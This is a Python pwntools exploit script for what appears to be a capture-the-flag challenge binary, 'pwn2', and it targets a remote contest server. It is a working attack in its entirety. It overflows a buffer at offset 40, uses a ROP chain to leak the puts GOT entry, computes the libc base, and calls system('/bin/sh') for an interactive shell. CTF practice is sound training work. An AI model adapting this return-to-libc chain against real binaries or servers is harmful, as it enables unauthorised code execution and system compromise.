from pwn import *

offset = 40

elf = context.binary = ELF("./pwn2_patched")

# p = process("./pwn2_patched")
p = remote(b"challs.n00bzunit3d.xyz", 61223)

ret = pack(0x000000000040101a)
poprdi = pack(0x0000000000401196)
puts_got = pack(elf.got['puts'])
system_got = pack(elf.got['system'])
puts = pack(elf.symbols['puts'])
main = pack(elf.symbols['main'])

payload = b"A" * offset
payload += poprdi + puts_got + puts 
# payload += poprdi + system_got + puts
payload += main

p.sendlineafter(b"Would you like a flag?\n", b'a')
p.sendlineafter(b"Would you like a flag?\n", payload)
p.recvuntil(b"fl4g}")

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
# system_leak = u64(p.recvline().strip().ljust(8, b'\x00'))

print(f"PUTS LEAK:{hex(puts_leak)}")
# print(f"SYSTEM LEAK:{hex(system_leak)}")

libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so", checksec=False)

libcBase = puts_leak - libc.symbols['puts']
print(f"LIBC BASE:{hex(libcBase)}")
system = pack(elf.symbols['system'])
binsh = pack(next(libc.search(b'/bin/sh')) + libcBase)

payload = b"A" * offset
payload += ret
payload += poprdi + binsh
payload += system

p.sendline()
p.sendline(payload)
p.interactive()